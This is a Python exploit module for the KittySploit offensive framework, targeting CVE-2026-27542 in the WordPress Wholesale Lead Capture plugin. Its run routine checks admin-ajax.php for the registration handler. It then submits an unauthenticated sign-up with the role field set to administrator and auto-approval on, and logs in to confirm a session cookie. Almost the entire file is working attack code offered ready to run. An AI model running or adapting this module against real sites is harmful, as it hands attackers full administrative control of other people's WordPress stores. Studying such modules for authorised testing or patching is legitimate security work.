#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-27542 — WWLC unauthenticated user creation with administrator role."""

import json
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Wholesale Lead Capture CVE-2026-27542 admin register",
        "description": "POST wwlc_create_user with wwlc_registration_role=administrator. Outputs credentials or HTTP client cookies only — no KittySploit framework session.",
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-27542"],
        "tags": [
            "auxiliary","wordpress", "woocommerce", "privesc", "cve-2026-27542"],
        "agent": {"approval_required": True, "produces": ["credentials", "risk_signals"]},
    }

    path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        schema = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            data={"action": "wwlc_create_user"},
            allow_redirects=False,
        )
        if not schema or "wwlc_email" not in (schema.text or ""):
            print_error("wwlc_create_user schema unavailable")
            return False
        user = f"wwlc{secrets.token_hex(4)}"
        email = f"{user}@example.test"
        pwd = f"Wwlc{secrets.token_hex(3)}Aa1!"
        fields = {
            "action": "wwlc_create_user",
            "wwlc_firstname": "Kitty",
            "wwlc_lastname": "Sploit",
            "wwlc_email": email,
            "wwlc_password": pwd,
            "wwlc_password_confirm": pwd,
            "wwlc_phone": "5551234567",
            "wwlc_company_name": "PoC",
            "wwlc_registration_role": "administrator",
            "wwlc_auto_approve": "yes",
        }
        create = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=fields,
            allow_redirects=False,
        )
        text = create.text or "" if create else ""
        if create and int(create.status_code or 0) == 200 and text not in ("-1", "0"):
            print_success(f"wwlc_create_user submitted for {email}")
            try:
                data = json.loads(text)
                print_status(json.dumps(data, indent=2)[:600])
            except json.JSONDecodeError:
                print_status(text[:400])
            login = self.http_request(
                method="POST",
                path=self._join("/wp-login.php"),
                data={"log": email, "pwd": pwd, "wp-submit": "Log In", "testcookie": "1"},
                allow_redirects=False,
            )
            if login and "wordpress_logged_in" in str(login.headers):
                print_success("wordpress_logged_in after login attempt")
                return True
            print_status("Verify credentials manually on wp-login.php")
            return True
        print_error("Registration failed")
        return False
